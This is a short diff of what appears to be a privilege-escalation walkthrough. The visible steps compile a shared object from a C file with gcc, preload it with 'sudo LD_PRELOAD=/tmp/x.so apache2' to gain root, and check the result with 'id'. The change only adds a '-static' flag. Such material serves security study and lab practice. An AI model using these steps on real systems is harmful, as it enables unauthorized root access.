@@ -81,7 +81,7 @@ void _init() {
 ```
 
 2. Save the file as `x.c`
-3. In command prompt type: `gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles`
+3. In command prompt type: `gcc -fPIC -shared -o /tmp/x.so x.c -nostartfiles  -static`
 	- *Note: must use tabs not spaces in C code*
 4. In command prompt type: `sudo LD_PRELOAD=/tmp/x.so apache2`
 5. In command prompt type: `id`
